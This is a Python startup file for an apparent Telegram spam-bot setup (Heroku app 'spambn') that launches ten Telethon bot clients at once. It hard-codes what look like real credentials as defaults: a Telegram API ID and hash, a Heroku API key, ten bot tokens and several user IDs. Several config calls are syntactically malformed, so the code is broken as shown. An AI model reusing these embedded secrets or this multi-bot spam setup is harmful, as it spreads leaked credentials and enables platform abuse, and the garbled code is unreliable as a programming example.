
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v0.3.1"

#values
API_ID = config("API_ID", "21884763") default=None, cast=int)
API_HASH = config("API_HASH","da0f54c91d30d9d9a61a80df3a3c1637" default=None)
ALIVE_PIC = config("ALIVE_PIC","https://te.legra.ph/file/d5508122024fa2f6aadb9.jpg" default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
OWNER_NAME = getenv("OWNER_NAME","Zeus" default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME","spambn" None)
HEROKU_API_KEY = config("HEROKU_API_KEY","c6d2706a-510c-407f-b6ce-d6adabf8b465" None)
BOT_TOKEN = config("BOT_TOKEN","6185268409:AAF4x1Tj2NGulVQwJEKtqbn9x86kpf1ZEmc" default=None)
BOT_TOKEN2 = config("BOT_TOKEN2","6070918053:AAGqzigaXt5t6m_9Euqd1EUUzktkvrkr2P4" default=None)
BOT_TOKEN3 = config("BOT_TOKEN3","5604597940:AAGn4A3fG9pg2U-witJZUVdqXyQG8GQJoJM" default=None)
BOT_TOKEN4 = config("BOT_TOKEN4","6296332343:AAHJfoPC20A7vhDMyZuHye3tS79gdHL0Q7k" default=None)
BOT_TOKEN5 = config("BOT_TOKEN5","6142882035:AAE4MfC6crcmEOTK7roqu6uQtkDFWMBY-2E" default=None)
BOT_TOKEN6 = config("BOT_TOKEN6","6200722825:AAEJJppDCNIZ5ZKanTvJNTh94UnAou8xcrI" default=None)
BOT_TOKEN7 = config("BOT_TOKEN7","5847030637:AAFZknDP-Oo8fQC6VTNCR6tdmWArGdAG1J4" default=None)
BOT_TOKEN8 = config("BOT_TOKEN8","5803872864:AAHhTsiqAseVBr4k_xdx8Ebw54ou3NDCNtA" default=None)
BOT_TOKEN9 = config("BOT_TOKEN9","6265350952:AAG6YcfoOPl3xtiD359rOezmx67JuW4fVX4" default=None)
BOT_TOKEN10 = config("BOT_TOKEN10","6227242806:AAGIVA8Vz0x6RHI91sTTWAdISoM1FYGFMYU" default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER","5505885484","5505885484","6225220080").split()))
if 5256676062 not in SUDO_USERS:
    SUDO_USERS.append(5937170640)

OWNER_ID = int(os.environ.get("OWNER_ID","5477247654" None))

# Don't Mess with Codes !! 
DATABASE_URL = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5937170640)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

print("[INFO] Successfully Started Bot Client Now Loading Plugins!") 
